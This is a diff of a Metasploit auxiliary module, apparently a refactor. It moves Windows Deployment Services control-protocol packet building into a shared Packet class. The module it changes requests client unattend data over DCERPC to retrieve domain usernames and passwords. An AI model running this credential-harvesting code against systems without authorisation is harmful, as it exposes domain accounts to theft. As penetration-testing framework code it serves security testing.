@@ -16,6 +16,7 @@ load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/packet.rb'
 load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/handle.rb'
 load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/wdscp.rb'
 load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/wdscp/constants.rb'
+load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/wdscp/packet.rb'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -50,47 +51,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(5040),
-			], self.class)
-		
-		#Easier way to make these into enum?
-		@architectures = {
-			'x64' => 9,
-			'x86' => 0,
-			'ia64' => 6,
-			'arm' => 5
-		}
-		
-		@pkt_type = {
-			'request' => 1,
-			'reply' => 2
-		}
-		
-		@opcode = {	
-			'IMG_ENUMERATE' => 2,
-			'LOG_INIT' => 3,
-			'LOG_MSG' => 4,
-			'GET_CLIENT_UNATTEND' => 5,
-			'GET_UNATTEND_VARIABLES' => 6,
-			'GET_DOMAIN_JOIN_INFORMATION' => 7,
-			'RESET_BOOT_PROGRAM' => 8,
-			'GET_MACHINE_DRIVER_PACKAGES' => 0x000000C8
-		}
-		
-		@base_type = {
-			'BYTE' => 0x0001,
-			'USHORT' => 0x0002,
-			'ULONG' => 0x0004,
-			'ULONG64' => 0x008,
-			'STRING' => 0x0010,
-			'WSTRING' => 0x0020,
-			'BLOB' => 0x0040
-		}
-		
-		@type_modifier = {
-			'NONE' => 0x0000,
-			'ARRAY' => 0x1000
-		}
-		
+			], self.class)	
 	end
 	
 	def run 
@@ -115,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
                         'Columns' => ['Architecture', 'Domain', 'Username', 'Password']
         })
 		
-		@architectures.each do |architecture|
+		WDS_CONST::ARCHITECTURE.each do |architecture|
 			result = request_client_unattend(architecture)
 			
 			unless result.nil?
@@ -149,61 +110,26 @@ class Metasploit3 < Msf::Auxiliary
 	end
 	
 	def request_client_unattend(architecture)	
-		# Construct WDS Control Protocol Message:
-		header = "\x38\x02\x00\x00\x00\x00\x00\x00\x38\x02\x00\x00\x00\x00\x00\x00" # Total Packet Length?
-		
-		endpoint_header = 	[	40, 																# Header Size
-								256, 																# Version
-								528,																# Packet Size
-								WDS_CONST::OS_DEPLOYMENT_GUID, # GUID (OS Deployment endpoint GUID)
-								"\x00"*16															# Reserved
-							].pack('vvVa16a16')
-							
-		operation_header = [ 	528,										# PacketSize
-								256, 										# Version
-								WDS_CONST::PACKET_TYPE[:REQUEST], 			# Packet_Type
-								0, 											# Padding
-								WDS_CONST::OPCODE[:GET_CLIENT_UNATTEND], 	# Opcode
-								4,											# Variable Count
-							].pack('VvCCVV')					
-		
-		
-		architecture_description_block = variable_description_block(
-											WDS_CONST::VAR_NAME_ARCHITECTURE, # Name
-											[architecture[1]].pack('C') # Value						
-										)
-
-		client_guid_variable = variable_description_block(
-											WDS_CONST::VAR_NAME_CLIENT_GUID,
+		# Construct WDS Control Protocol Message		
+		packet = Rex::Proto::DCERPC::WDSCP::Packet.new(:REQUEST, :GET_CLIENT_UNATTEND)
+		packet.add_var(WDS_CONST::VAR_NAME_ARCHITECTURE, [architecture[1]].pack('C'))			
+		packet.add_var(WDS_CONST::VAR_NAME_CLIENT_GUID, 
 											"\x35\x00\x36\x00\x34\x00\x44\x00\x41\x00\x36\x00\x31\x00\x44\x00"\
 											"\x32\x00\x41\x00\x45\x00\x31\x00\x41\x00\x41\x00\x42\x00\x32\x00"\
 											"\x38\x00\x36\x00\x34\x00\x46\x00\x34\x00\x34\x00\x46\x00\x32\x00"\
 											"\x38\x00\x32\x00\x46\x00\x30\x00\x34\x00\x33\x00\x34\x00\x30\x00"\
-											"\x00\x00"
-										)
-											
-		client_mac_variable = variable_description_block(
-											WDS_CONST::VAR_NAME_CLIENT_MAC,
+											"\x00\x00")
+		packet.add_var(WDS_CONST::VAR_NAME_CLIENT_MAC,
 											"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
 											"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
 											"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x35\x00\x30\x00"\
 											"\x35\x00\x36\x00\x33\x00\x35\x00\x31\x00\x41\x00\x37\x00\x35\x00"\
-											"\x00\x00"
-										)
+											"\x00\x00")
 
-		version_variable = variable_description_block(
-											WDS_CONST::VAR_NAME_VERSION,
-											"\x00\x00\x00\x01\x00\x00\x00\x00"
-										)
+		packet.add_var(WDS_CONST::VAR_NAME_VERSION,"\x00\x00\x00\x01\x00\x00\x00\x00")
 		
-		wdsc_packet = header + 
-					endpoint_header + 
-					operation_header + 
-					architecture_description_block + 
-					client_guid_variable + 
-					client_mac_variable + 
-					version_variable
-
+		wdsc_packet = packet.create
+		
 		vprint_status("Sending #{architecture[0]} Client Unattend request ...")
 		response = dcerpc.call(0, wdsc_packet)
 
